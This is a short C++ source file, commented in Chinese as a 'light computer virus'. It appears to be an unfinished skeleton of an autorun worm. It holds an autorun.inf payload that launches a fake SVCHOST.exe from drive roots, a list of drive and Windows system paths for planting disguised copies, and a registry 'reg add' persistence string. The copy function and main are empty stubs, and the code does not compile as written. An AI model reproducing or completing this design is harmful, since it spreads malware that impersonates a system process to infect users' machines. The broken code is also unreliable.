// vProgramSystem.cpp : 定义控制台应用程序的入口点。
//

//轻型计算病毒

#include "stdafx.h"
#include<stdlib.h>
#include<iostream>
#include<string>

#define SVCHOST_NUM 6

//4
char *autorun = { "[autorun]\nopen=SVCHOST.exe\n\nshell\\1 \\Command=SCVHOST.exe\nshell\\2\\=Open" };
char *files_autorun[10] = {
	"c:\\autorun.inf",
	"e:\\autorun.inf",
	"d:\\autorun.inf",
};

char *files_svchost[SVCHOST_NUM + 1] = {
	"c:\\windows\\system\\MSMOUSE.DLL",
	"c:\\windows\\system\\SVCHOST.exe",
	"c:\\windows\\SVCHOST.exe",
	"c:\\SVCHOST.exe",
	"d:\\SVCHOST.exe",
	"e:\\SVCHOST.exe",
	"SVCHOST.exe",
};

char *regadd = "reg add \"HKLM\SOFTWARE\Micsoft\Current\"";//注册表



int DataCopy(char *infile, char *outfile)
{
	FILE *input, *output;
	char *temp;
	if (strcmp(infile,outfile)!=0)
	{

	}


}




int _tmain(int argc, _TCHAR* argv[])
{



	return 0;
}

































